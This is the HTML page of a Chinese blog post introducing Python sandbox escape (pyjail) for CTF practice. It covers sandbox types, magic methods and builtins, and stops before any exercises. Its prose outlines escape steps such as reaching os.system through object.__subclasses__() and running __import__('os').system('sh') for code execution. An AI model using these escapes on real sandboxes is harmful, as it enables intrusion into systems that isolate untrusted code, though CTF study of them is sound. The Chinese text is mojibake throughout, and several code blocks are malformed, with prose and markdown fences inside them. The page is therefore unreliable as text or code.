<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Pythonæ²™ç®±é€ƒé€¸ | deCOLE's Blog</title><meta name="author" content="deCOLE"><meta name="copyright" content="deCOLE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Pythonæ²™ç®±é€ƒé€¸">
<meta property="og:type" content="article">
<meta property="og:title" content="Pythonæ²™ç®±é€ƒé€¸">
<meta property="og:url" content="http://example.com/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
<meta property="og:site_name" content="deCOLE&#39;s Blog">
<meta property="og:description" content="Pythonæ²™ç®±é€ƒé€¸">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/touxiang.jpg">
<meta property="article:published_time" content="2025-03-17T16:00:00.000Z">
<meta property="article:modified_time" content="2025-05-27T07:51:49.004Z">
<meta property="article:author" content="deCOLE">
<meta property="article:tag" content="æ¼æ´å­¦ä¹ ">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/touxiang.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Pythonæ²™ç®±é€ƒé€¸",
  "url": "http://example.com/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/",
  "image": "http://example.com/img/touxiang.jpg",
  "datePublished": "2025-03-17T16:00:00.000Z",
  "dateModified": "2025-05-27T07:51:49.004Z",
  "author": [
    {
      "@type": "Person",
      "name": "deCOLE",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/touxiang.jpg"><link rel="canonical" href="http://example.com/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Pythonæ²™ç®±é€ƒé€¸',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(img/qccq.jpg);"></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">deCOLE's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Pythonæ²™ç®±é€ƒé€¸</span></a></span><div id="menus"></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Pythonæ²™ç®±é€ƒé€¸</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2025-03-17T16:00:00.000Z" title="å‘è¡¨äº 2025-03-18 00:00:00">2025-03-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2025-05-27T07:51:49.004Z" title="æ›´æ–°äº 2025-05-27 15:51:49">2025-05-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><h1 id="Pythonæ²™ç®±é€ƒé€¸"><a href="#Pythonæ²™ç®±é€ƒé€¸" class="headerlink" title="Pythonæ²™ç®±é€ƒé€¸"></a>Pythonæ²™ç®±é€ƒé€¸</h1><p>â€‹	åœ¨å­¦äº†SSTIä¹‹åï¼Œå‘ç°Pythonè¿˜æœ‰ä¸€ä¸ªæ²™ç®±é€ƒé€¸æ²¡å­¦ï¼Œæ°å¥½è¿™ç©æ„åˆå’Œæ¡†æ¶å•¥çš„æŒ¨ä¸Šè¾¹ï¼Œä¸ºäº†çŸ¥è¯†çš„è¿è´¯æ€§ï¼Œå†³å®šåšä¸€ä¸ªæ²™ç®±é€ƒé€¸çš„å­¦ä¹ </p>
<h2 id="ä¸€äº›å‰ç½®çŸ¥è¯†çš„ä»‹ç»"><a href="#ä¸€äº›å‰ç½®çŸ¥è¯†çš„ä»‹ç»" class="headerlink" title="ä¸€äº›å‰ç½®çŸ¥è¯†çš„ä»‹ç»"></a>ä¸€äº›å‰ç½®çŸ¥è¯†çš„ä»‹ç»</h2><h3 id="æ²™ç®±"><a href="#æ²™ç®±" class="headerlink" title="æ²™ç®±"></a>æ²™ç®±</h3><p>pythonæ²™ç®±é€ƒé€¸ï¼Œæ˜¯CTFå½“ä¸­çš„ä¸€ç±»é¢˜çš„ç»Ÿç§°ï¼ˆPYjailï¼‰</p>
<p>â€‹	ä¸ºäº†ä¸è®©æ¶æ„ç”¨æˆ·æ‰§è¡Œä»»æ„æ¶æ„çš„pythonä»£ç ï¼Œæˆ‘ä»¬å¼•ç”¨äº†æ²™ç®±æœºåˆ¶ï¼Œä¸€äº›å¯èƒ½å­˜åœ¨æ¶æ„æ”»å‡»ä»£ç çš„è¯­å¥å°±èƒ½åœ¨æ²™ç®±ç¯å¢ƒå½“ä¸­è¿è¡Œï¼Œæ²™ç®±å†…å¯èƒ½ä¼šç¦ç”¨ä¸€äº›æ•æ„Ÿå‡½æ•°ï¼Œä½¿å¾—æ¶æ„ä»£ç åªä½œç”¨äºæ²™ç®±å†…ï¼Œè€Œä¸ä¼šå¯¹æˆ‘ä»¬çš„æœåŠ¡å™¨ä»¥åŠå…¶ä»–èµ„äº§é€ æˆç ´å</p>
<p>â€‹	<strong>å¸¸è§çš„æ²™ç®±æŠ€æœ¯</strong></p>
<ol>
<li><p>æ¨¡å—æ²™ç®±</p>
<p>å¦‚restrictedpythonå’ŒPyExecJSï¼Œè¿™äº›å·¥å…·å¯ä»¥åœ¨ç‹¬ç«‹çš„æ‰§è¡Œç¯å¢ƒå½“ä¸­è¿è¡Œpythonä»£ç ï¼Œå¹¶é™åˆ¶è®¿é—®ç³»ç»Ÿèµ„æºã€‚é€šå¸¸å®ƒä»¬ä¼šæä¾›ä¸€ç»„å…è®¸å’Œç¦æ­¢çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯é»‘ç™½åå•ï¼Œæ¥æ§åˆ¶ä»£ç çš„è¡Œä¸º</p>
<p>â€‹    ä»£ç ç¤ºä¾‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from restrictedpython import compile_restricted, safe_builtins</span><br><span class="line"></span><br><span class="line">code = &quot;&quot;&quot;</span><br><span class="line">result = 1 + 1</span><br><span class="line">print(result)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">restricted_globals = &#123;&quot;__builtins__&quot;: safe_builtins&#125;</span><br><span class="line">bytecode = compile_restricted(code, &quot;&lt;string&gt;&quot;, &quot;exec&quot;)</span><br><span class="line">exec(bytecode, restricted_globals)</span><br></pre></td></tr></table></figure>
</li>
<li><p>å®¹å™¨åŒ–æŠ€æœ¯</p>
<p>è¿˜æœ‰ä¸€äº›æ²™ç®±æŠ€æœ¯æ˜¯é€šè¿‡å®¹å™¨åŒ–æŠ€æœ¯æ¥è¾¾æˆçš„ï¼Œæ¯”å¦‚æˆ‘ä»¬ç†Ÿæ‚‰çš„Dockerï¼Œèƒ½å¤Ÿå°†ä¸å—ä¿¡ä»»çš„ä»£ç åœ¨ä¸€ä¸ªç‹¬ç«‹çš„å®¹å™¨é‡Œé¢è¿è¡Œï¼Œéš”ç¦»å±å®³ï¼Œä½¿å…¶æ— æ³•è®¿é—®ä¸»æœºç³»ç»Ÿèµ„æº</p>
<p>â€‹    ä»£ç ç¤ºä¾‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm python:3.9 python -c &quot;print(&#x27;Hello, from inside the container!&#x27;)&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¸“ç”¨çš„æ²™ç®±åº“</p>
<p>Pythonå½“ä¸­æœ‰ä¸€äº›ä¸“ç”¨çš„æ²™ç®±åº“ï¼Œä¹Ÿèƒ½å¤Ÿæ‹¿æ¥è¿è¡Œæ²™ç®±ï¼Œæ¯”å¦‚PySandboxå’ŒPyPySandbox</p>
</li>
</ol>
<h3 id="Pythonçš„ä¸€äº›ç‰¹æ€§"><a href="#Pythonçš„ä¸€äº›ç‰¹æ€§" class="headerlink" title="Pythonçš„ä¸€äº›ç‰¹æ€§"></a>Pythonçš„ä¸€äº›ç‰¹æ€§</h3><ul>
<li><p>åœ¨pythonä¸­ï¼Œç±»å‡ç»§æ‰¿è‡ª<code>object</code>åŸºç±»ï¼›</p>
</li>
<li><p>pythonä¸­ç±»æœ¬èº«å…·æœ‰ä¸€äº›é™æ€æ–¹æ³•ï¼Œå¦‚<code>bytes.fromhex</code>ã€<code>int.from_bytes</code>ç­‰ã€‚å¯¹äºè¿™äº›ç±»çš„å®ä¾‹ï¼Œä¹Ÿèƒ½è°ƒç”¨è¿™äº›é™æ€æ–¹æ³•ã€‚å¦‚<code>b&#39;1&#39;.fromhex(&#39;1234&#39;)</code>ï¼Œè¿”å›<code>b&#39;\x124&#39;</code>ã€‚ï¼ˆä¸€ä¸ªç‰¹æ®Šçš„ä¾‹å­æ˜¯æ•´æ•°å¸¸é‡ä¸æ”¯æŒè¿™æ ·æ“ä½œï¼Œå¦‚è¾“å…¥<code>3.from_bytes</code>ä¼šæŠ¥é”™ï¼‰</p>
</li>
<li><p>pythonä¸­çš„ç±»è¿˜å…·æœ‰ä¸€ç³»åˆ—çš„é­”æœ¯æ–¹æ³•ï¼Œè¿™ä¸ªç‰¹æ€§å¯ä»¥å¯¹æ¯”phpçš„é­”æœ¯æ–¹æ³•ï¼Œä»¥åŠC++çš„è¿ç®—ç¬¦é‡è½½ç­‰ã€‚ä¸€äº›å‡½æ•°çš„å®ç°ä¹Ÿæ˜¯ç›´æ¥è°ƒç”¨é­”æœ¯æ–¹æ³•çš„ã€‚å¸¸ç”¨çš„é­”æœ¯æ–¹æ³•æœ‰è¿™äº›ï¼Œæ›´å¤šå¯å‚è€ƒ<a href="https://link.zhihu.com/?target=https://rszalski.github.io/magicmethods/">è¿™é‡Œ</a>ï¼š</p>
<ul>
<li><p><code>__init__</code>ï¼šæ„é€ å‡½æ•°ã€‚è¿™ä¸ªåœ¨å®ä¾‹åŒ–ç±»çš„æ—¶å€™å°±ä¼šç”¨åˆ°ï¼Œä¸€èˆ¬æ˜¯æ¥å—ç±»åˆå§‹åŒ–çš„å‚æ•°ï¼Œå¹¶ä¸”è¿›è¡Œä¸€ç³»åˆ—åˆå§‹åŒ–æ“ä½œã€‚</p>
</li>
<li><p><code>__len__</code>ï¼šè¿”å›å¯¹è±¡çš„é•¿åº¦ã€‚å¯¹ä¸€ä¸ªå¯¹è±¡<code>a</code>ä½¿ç”¨<code>len(a)</code>æ—¶ï¼Œä¼šå°è¯•è°ƒç”¨<code>a.__len__()</code>ã€‚è¿™ä¸ªåšç‚¼ä¸¹çš„åŒå­¦åº”è¯¥å¾ˆç†Ÿæ‚‰ï¼Œä¾‹å¦‚è¦é€šè¿‡ç»§æ‰¿<code>torch.utils.data.Dataset</code>æ¥å®ç°è‡ªå·±çš„æ•°æ®é›†æ—¶ï¼Œå°±éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼›</p>
</li>
<li><p><code>__str__</code>ï¼šè¿”å›å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚å¯¹ä¸€ä¸ªå¯¹è±¡<code>a</code>ä½¿ç”¨<code>str(a)</code>æ—¶ï¼Œä¼šå°è¯•è°ƒç”¨<code>a.__str__()</code>ã€‚è¿™åœ¨æˆ‘ä»¬è‡ªå·±å®ç°ä¸€äº›ç±»ï¼Œè­¬å¦‚å¤æ•°ã€äºŒå‰æ ‘ã€æœ‰é™åŸŸã€æ¤­åœ†æ›²çº¿ç­‰æ—¶ï¼Œé€šè¿‡å®ç°è¯¥æ–¹æ³•ï¼Œèƒ½å°†å¯¹è±¡çš„å†…å®¹è¾ƒå¥½åœ°æ‰“å°å‡ºæ¥ã€‚ï¼ˆ<code>print</code>å‡½æ•°ä¸­ä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡çš„<code>__str__</code>æ–¹æ³•ï¼‰ç›¸ä¼¼åœ°ï¼Œè¿˜æœ‰<code>__int__</code>é­”æœ¯æ–¹æ³•ä¹Ÿç”¨äºç±»å‹è½¬æ¢ï¼Œä¸è¿‡è¾ƒå°‘ä½¿ç”¨ï¼›</p>
</li>
<li><p><code>__getitem__</code>ï¼šæ ¹æ®ç´¢å¼•è¿”å›å¯¹è±¡çš„æŸä¸ªå…ƒç´ ã€‚å¯¹ä¸€ä¸ªå¯¹è±¡<code>a</code>ä½¿ç”¨<code>a[1]</code>æ—¶ï¼Œä¼šå°è¯•è°ƒç”¨<code>a.__getitem__(1)</code>ã€‚åŒæ ·ï¼Œå½“æˆ‘ä»¬é€šè¿‡ç»§æ‰¿<code>torch.utils.data.Dataset</code>æ¥å®ç°è‡ªå·±çš„æ•°æ®é›†æ—¶ï¼Œå°±éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ã€‚æœ‰<code>__getitem__</code>ï¼Œè‡ªç„¶ä¹Ÿæœ‰å¯¹åº”çš„<code>__setitem__</code>ï¼›</p>
</li>
<li><p><code>__add__</code>ã€<code>__sub__</code>ã€<code>__mul__</code>ã€<code>__div__</code>ã€<code>__mod__</code>ï¼šç®—æœ¯è¿ç®—ï¼ŒåŠ å‡ä¹˜é™¤æ¨¡ã€‚å¦‚å¯¹ä¸€ä¸ªå¯¹è±¡<code>a</code>ä½¿ç”¨<code>a+b</code>æ—¶ï¼Œä¼šå°è¯•è°ƒç”¨<code>a.__add__(b)</code>ã€‚ç›¸åº”åœ°ï¼Œå¯¹äºæœ‰äº›è¿ç®—ï¼Œå¯¹è±¡éœ€æ”¾åœ¨åé¢ï¼ˆç¬¬äºŒä¸ªæ“ä½œæ•°ï¼‰çš„ï¼Œåˆ™éœ€å®ç°<code>__radd__</code>ã€<code>__rsub__</code>ã€<code>__rmul__</code>ã€<code>__rdiv__</code>ã€<code>__rmod__</code>ï¼Œå¦‚æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹çš„å€ç‚¹è¿ç®—<code>G -&gt; d * G</code>ï¼Œå°±å¯ä»¥é€šè¿‡å®ç°<code>__rmul__</code>æ¥å®ç°ã€‚</p>
</li>
<li><p><code>__and__</code>ï¼Œ<code>__or__</code>ã€<code>__xor__</code>ï¼šé€»è¾‘è¿ç®—ï¼Œå’Œç®—æœ¯è¿ç®—ç±»ä¼¼ï¼›</p>
</li>
<li><p><code>__eq__</code>ï¼Œ<code>__ne__</code>ã€<code>__lt__</code>ã€<code>__gt__</code>ã€<code>__le__</code>ã€<code>__ge__</code>ï¼šæ¯”è¾ƒè¿ç®—ï¼Œå’Œç®—æœ¯è¿ç®—ç±»ä¼¼ï¼›ä¾‹å¦‚<code>&#39;è´µå·&#39; &gt; &#39;å¹¿è¥¿&#39;</code>ï¼Œå°±ä¼šè½¬è€Œè°ƒç”¨<code>&#39;è´µå·&#39;.__gt__(&#39;å¹¿è¥¿&#39;)</code>ï¼›</p>
</li>
<li><p><code>__getattr__</code>ï¼šå¯¹è±¡æ˜¯å¦å«æœ‰æŸå±æ€§ã€‚å¦‚æœæˆ‘ä»¬å¯¹å¯¹è±¡<code>a</code>æ‰€å¯¹åº”çš„ç±»å®ç°äº†è¯¥æ–¹æ³•ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨æœªå®ç°çš„<code>a.b</code>æ—¶ï¼Œå°±ä¼šè½¬è€Œè°ƒç”¨<code>a.__getattr__(b)</code>ã€‚è¿™ä¹Ÿç­‰ä»·äºç”¨å‡½æ•°çš„æ–¹æ³•è°ƒç”¨ï¼š<code>getattr(a, &#39;b&#39;)</code>ã€‚æœ‰<code>__getattr__</code>ï¼Œè‡ªç„¶ä¹Ÿæœ‰å¯¹åº”çš„<code>__setattr__</code>ï¼›</p>
</li>
<li><p><code>__subclasses__</code>ï¼šè¿”å›å½“å‰ç±»çš„æ‰€æœ‰å­ç±»ã€‚ä¸€èˆ¬æ˜¯ç”¨åœ¨<code>object</code>ç±»ä¸­ï¼Œåœ¨<code>object.__subclasses__()</code>ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°<code>os</code>æ¨¡å—ä¸­çš„ç±»ï¼Œç„¶åå†æ‰¾åˆ°<code>os</code>ï¼Œå¹¶ä¸”æ‰§è¡Œ<code>os.system</code>ï¼Œå®ç°RCEã€‚</p>
</li>
</ul>
</li>
<li><p>ç›¸å¯¹åº”åœ°ï¼Œpythonçš„ç±»ä¸­ä¹ŸåŒ…å«ç€ä¸€äº›é­”æœ¯å±æ€§ï¼š</p>
<ul>
<li><pre><code>__dict__
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ï¼šå¯ä»¥æŸ¥çœ‹å†…éƒ¨æ‰€æœ‰å±æ€§åå’Œå±æ€§å€¼ç»„æˆçš„å­—å…¸ã€‚è­¬å¦‚ä¸‹é¢è¿™æ®µä»£ç ï¼š</span><br><span class="line"></span><br><span class="line">```py</span><br><span class="line">class KFCCrazyThursday:</span><br><span class="line">    vivo = 50</span><br><span class="line"></span><br><span class="line">print(KFCCrazyThursday.__dict__)</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<p>å°±èƒ½çœ‹åˆ°å­—å…¸ä¸­åŒ…å«<code>&#39;vivo&#39;: 50</code>çš„é”®å€¼å¯¹ã€‚<strong>æ³¨æ„åœ¨pythonä¸­ï¼Œ<code>dict()</code>æ˜¯å°†ç±»è½¬æˆå­—å…¸çš„å‡½æ•°ï¼Œè·Ÿæ­¤é­”æœ¯å±æ€§æ— å…³ã€‚</strong></p>
<ul>
<li><pre><code>__doc__
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ï¼šç±»çš„å¸®åŠ©æ–‡æ¡£ã€‚é»˜è®¤ç±»å‡æœ‰å¸®åŠ©æ–‡æ¡£ã€‚å¯¹äºè‡ªå®šä¹‰çš„ç±»ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±å®ç°ã€‚</span><br><span class="line"></span><br><span class="line">```py</span><br><span class="line">class KFCCrazyThursday:</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    And you broke up for seven years, you still can affect my mood, I still keep our photo, remember your birthday, OK? I have countless times to find your impulse, But still hold back, this message I do not block you, because I am your forever blacklist, but I love you, from the past to the present, a full love of you for eight years, But now I&#x27;m not sad, because I have no idea who wrote this or who this girl is, and I just want to tell you by the way: Today is Crazy Thursday, I want to eat KFC</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    vivo = 50</span><br><span class="line"></span><br><span class="line">print(KFCCrazyThursday.__doc__)</span><br></pre></td></tr></table></figure>

å°±ä¼šæ‰“å°ä¸Šé¢çš„æ–‡æ¡£ï¼›

- `__class__`ï¼šè¿”å›å½“å‰å¯¹è±¡æ‰€å±çš„ç±»ã€‚å¦‚`&#39;&#39;.__class__`ä¼šè¿”å›`&lt;class &#39;str&#39;&gt;`ã€‚æ‹¿åˆ°ç±»ä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡æ„é€ å‡½æ•°ç”Ÿæˆæ–°çš„å¯¹è±¡ï¼Œå¦‚`&#39;&#39;.__class__(4396)`ï¼Œå°±ç­‰ä»·äº`str(4396)`ï¼Œå³`&#39;4396&#39;`ï¼›

- `__base__`ï¼šè¿”å›å½“å‰ç±»çš„åŸºç±»ã€‚å¦‚`str.__base__`ä¼šè¿”å›`&lt;class &#39;object&#39;&gt;`ï¼›
</code></pre>
</li>
</ul>
</li>
<li><p>ä»¥åŠè¿˜æœ‰ä¸€äº›é‡è¦çš„å†…ç½®å‡½æ•°å’Œå˜é‡ï¼š</p>
<ul>
<li><code>dir</code>ï¼šæŸ¥çœ‹å¯¹è±¡çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ã€‚åœ¨æˆ‘ä»¬æ²¡æœ‰æ€è·¯çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡è¯¥å‡½æ•°æŸ¥çœ‹æ‰€æœ‰å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•ï¼›æ­¤å¤–ï¼Œåœ¨é¢˜ç›®ç¦ç”¨å¼•å·ä»¥åŠå°æ•°ç‚¹æ—¶ï¼Œä¹Ÿå¯ä»¥å…ˆç”¨æ‹¿åˆ°ç±»æ‰€æœ‰å¯ç”¨æ–¹æ³•ï¼Œå†ç´¢å¼•åˆ°æ–¹æ³•åï¼Œå¹¶ä¸”é€šè¿‡<code>getattr</code>æ¥æ‹¿åˆ°ç›®æ ‡æ–¹æ³•ã€‚</li>
<li><code>chr</code>ã€<code>ord</code>ï¼šå­—ç¬¦ä¸ASCIIç è½¬æ¢å‡½æ•°ï¼Œèƒ½å¸®æˆ‘ä»¬ç»•è¿‡ä¸€äº›WAF</li>
<li><code>globals</code>ï¼šè¿”å›æ‰€æœ‰å…¨å±€å˜é‡çš„å‡½æ•°ï¼›</li>
<li><code>locals</code>ï¼šè¿”å›æ‰€æœ‰å±€éƒ¨å˜é‡çš„å‡½æ•°ï¼›</li>
<li><code>__import__</code>ï¼šè½½å…¥æ¨¡å—çš„å‡½æ•°ã€‚ä¾‹å¦‚<code>import os</code>ç­‰ä»·äº<code>os = __import__(&#39;os&#39;)</code>ï¼›</li>
<li><code>__name__</code>ï¼šè¯¥å˜é‡æŒ‡ç¤ºå½“å‰è¿è¡Œç¯å¢ƒä½äºå“ªä¸ªæ¨¡å—ä¸­ã€‚å¦‚æˆ‘ä»¬pythonä¸€èˆ¬å†™çš„<code>if __name__ == &#39;__main__&#39;:</code>ï¼Œå°±æ˜¯æ¥åˆ¤æ–­æ˜¯å¦æ˜¯ç›´æ¥è¿è¡Œè¯¥è„šæœ¬ã€‚å¦‚æœæ˜¯ä»å¦å¤–çš„åœ°æ–¹importçš„è¯¥è„šæœ¬çš„è¯ï¼Œé‚£<code>__name__</code>å°±ä¸ä¸º<code>__main__</code>ï¼Œå°±ä¸ä¼šæ‰§è¡Œä¹‹åçš„ä»£ç ã€‚æ›´å¤šå‚è€ƒ<a href="https://link.zhihu.com/?target=https://www.geeksforgeeks.org/__name__-a-special-variable-in-python/">è¿™é‡Œ</a>ï¼›</li>
<li><code>__builtins__</code>ï¼šåŒ…å«å½“å‰è¿è¡Œç¯å¢ƒä¸­é»˜è®¤çš„æ‰€æœ‰å‡½æ•°ä¸ç±»ã€‚å¦‚ä¸Šé¢æ‰€ä»‹ç»çš„æ‰€æœ‰é»˜è®¤å‡½æ•°ï¼Œå¦‚<code>str</code>ã€<code>chr</code>ã€<code>ord</code>ã€<code>dict</code>ã€<code>dir</code>ç­‰ã€‚åœ¨pyjailçš„æ²™ç®±ä¸­ï¼Œå¾€å¾€<code>__builtins__</code>è¢«ç½®ä¸º<code>None</code>ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½åˆ©ç”¨ä¸Šè¿°çš„å‡½æ•°ã€‚æ‰€ä»¥ä¸€ç§æ€è·¯å°±æ˜¯æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡ç±»çš„åŸºç±»å’Œå­ç±»æ‹¿åˆ°<code>__builtins__</code>ï¼Œå†<code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code>è¿›è¡ŒRCEï¼›</li>
<li><code>__file__</code>ï¼šè¯¥å˜é‡æŒ‡ç¤ºå½“å‰è¿è¡Œä»£ç æ‰€åœ¨è·¯å¾„ã€‚å¦‚<code>open(__file__).read()</code>å°±æ˜¯è¯»å–å½“å‰è¿è¡Œçš„pythonæ–‡ä»¶ä»£ç ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>è¯¥å˜é‡ä»…åœ¨è¿è¡Œä»£ç æ–‡ä»¶æ—¶ä¼šäº§ç”Ÿï¼Œåœ¨è¿è¡Œäº¤äº’å¼ç»ˆç«¯æ—¶ä¸ä¼šæœ‰æ­¤å˜é‡</strong>ï¼›</li>
<li><code>_</code>ï¼šè¯¥å˜é‡è¿”å›ä¸Šä¸€æ¬¡è¿è¡Œçš„pythonè¯­å¥ç»“æœã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>è¯¥å˜é‡ä»…åœ¨è¿è¡Œäº¤äº’å¼ç»ˆç«¯æ—¶ä¼šäº§ç”Ÿï¼Œåœ¨è¿è¡Œä»£ç æ–‡ä»¶æ—¶ä¸ä¼šæœ‰æ­¤å˜é‡</strong>ã€‚</li>
</ul>
</li>
</ul>
<p>å‰ç½®ç†è®ºå¯¼å®Œäº†ï¼Œåšä¸€äº›é¢˜æ¥è¯•è¯•æ‰‹å§</p>
